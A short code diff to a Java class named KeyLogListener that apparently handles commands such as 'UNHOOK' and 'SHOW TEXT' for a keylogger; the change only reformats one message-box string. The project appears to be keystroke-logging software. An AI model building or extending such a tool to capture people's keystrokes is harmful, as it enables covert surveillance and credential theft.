@@ -39,8 +39,7 @@ public class KeyLogListener {
 				if (keyRequestLine.equals("UNHOOK"))
 				{
 					//thread.suspend();
-					JOptionPane.showMessageDialog(null, "Already unhook"
-							+ "!");
+					JOptionPane.showMessageDialog(null, "Already unhook" + "!");
 					KeyLog.UnKeyLogger(keyLog);					
 				}
 				if (keyRequestLine.equals("SHOW TEXT"))
